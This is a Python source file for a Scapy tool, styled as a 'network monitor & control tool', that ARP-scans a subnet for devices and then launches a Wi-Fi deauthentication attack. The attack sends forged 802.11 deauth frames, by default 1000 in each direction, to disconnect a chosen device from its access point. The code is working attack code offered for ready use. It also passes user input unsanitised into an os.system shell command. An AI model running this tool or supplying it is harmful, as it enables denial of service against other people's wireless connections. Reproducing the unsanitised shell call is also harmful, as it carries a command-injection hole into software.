from scapy.all import *
import os
from scapy.layers.l2 import getmacbyip

def get_mac_vendor(mac_address):
    try:
        oui_prefix = mac_address[:8].upper().replace(":", "-")
        vendor_file = "/usr/share/nmap/nmap-mac-prefixes"
        with open(vendor_file, "r") as f:
            for line in f:
                if line.startswith(oui_prefix):
                    return line.split("\t")[1].strip()
        return "Unknown Vendor"
    except Exception:
        return "Vendor Lookup Failed"

devices = {}

def display_banner():
    banner = """
 _____            _           ___               _
|_   _| _ __ _ __| |_____ _ _/ __|_ __  __ _ __| |_____ _ _
  | || '_/ _` / _| / / -_) '_\__ \ '  \/ _` / _| / / -_) '_|
  |_||_| \__,_\__|_\_\___|_| |___/_|_|_\__,_\__|_\_\___|_| v1.1
NETWORK MONITOR & CONTROL TOOL By, Sheikh Nightshader
    """
    print(f"\033[1;32m{banner}\033[0m")

def scan_network(interface, subnet):
    print("\033[1;34m[*] Scanning for devices...\033[0m")
    try:
        devices.clear()
        arp_request = ARP(pdst=subnet)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        result = srp(packet, timeout=5, iface=interface, verbose=False)[0]

        for sent, received in result:
            mac = received.hwsrc.upper()
            ip = received.psrc
            vendor = get_mac_vendor(mac)
            if mac not in devices:
                devices[mac] = {"IP": ip, "Vendor": vendor}
                print(f"\033[1;33m[+] Found Device: MAC: {mac}, IP: {ip}, Vendor: {vendor}\033[0m")
    except Exception as e:
        print(f"\033[1;31m[!] Error during scanning: {e}\033[0m")

def deauth_attack(interface, target_mac, ap_mac, count=1000):
    packet_to_client = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    packet_to_ap = RadioTap() / Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

    print(f"\033[1;31m[*] Launching Deauth attack on target MAC: {target_mac}...\033[0m")
    try:
        for _ in range(count):
            sendp(packet_to_client, iface=interface, verbose=False)
            sendp(packet_to_ap, iface=interface, verbose=False)
        print("\033[1;32m[+] Deauth attack completed.\033[0m")
    except KeyboardInterrupt:
        print("\033[1;32m[+] Deauth attack stopped by user.\033[0m")

def main():
    display_banner()

    interface = input("\033[1;33mEnter your Wi-Fi interface (e.g., wlan0): \033[0m")
    subnet = input("\033[1;33mEnter your network range (e.g., 192.168.1.0/24): \033[0m")

    try:
        os.system(f"ifconfig {interface} up")
    except Exception as e:
        print(f"\033[1;31m[!] Failed to bring up interface: {e}\033[0m")
        return

    while True:
        print("\n\033[1;33mOptions:\033[0m")
        print("1. Scan for devices")
        print("2. Deauth a device")
        print("3. Quit")
        choice = input("\033[1;33mSelect an option: \033[0m")

        if choice == "1":
            scan_network(interface, subnet)
            if devices:
                print("\n\033[1;32mDetected Devices:\033[0m")
                for idx, (mac, details) in enumerate(devices.items(), start=1):
                    print(f"[{idx}] MAC: {mac}, IP: {details['IP']}, Vendor: {details['Vendor']}")
            else:
                print("\033[1;31m[!] No devices found on the network.\033[0m")
        elif choice == "2":
            if not devices:
                print("\033[1;31m[!] No devices detected. Please scan the network first.\033[0m")
                continue

            try:
                target_idx = int(input("\033[1;33mEnter the device number to deauth: \033[0m")) - 1
                if 0 <= target_idx < len(devices):
                    target_mac = list(devices.keys())[target_idx]
                    ap_mac = input("\033[1;33mEnter the Access Point MAC address: \033[0m")
                    attack_count = int(input("\033[1;33mEnter the number of packets to send (default 1000): \033[0m") or 1000)
                    deauth_attack(interface, target_mac, ap_mac, attack_count)
                else:
                    print("\033[1;31m[!] Invalid device number.\033[0m")
            except ValueError:
                print("\033[1;31m[!] Invalid input. Please enter a valid number.\033[0m")
        elif choice == "3":
            print("\033[1;32m[+] Exiting...\033[0m")
            break
        else:
            print("\033[1;31m[!] Invalid option. Please select 1, 2, or 3.\033[0m")

if __name__ == "__main__":
    main()
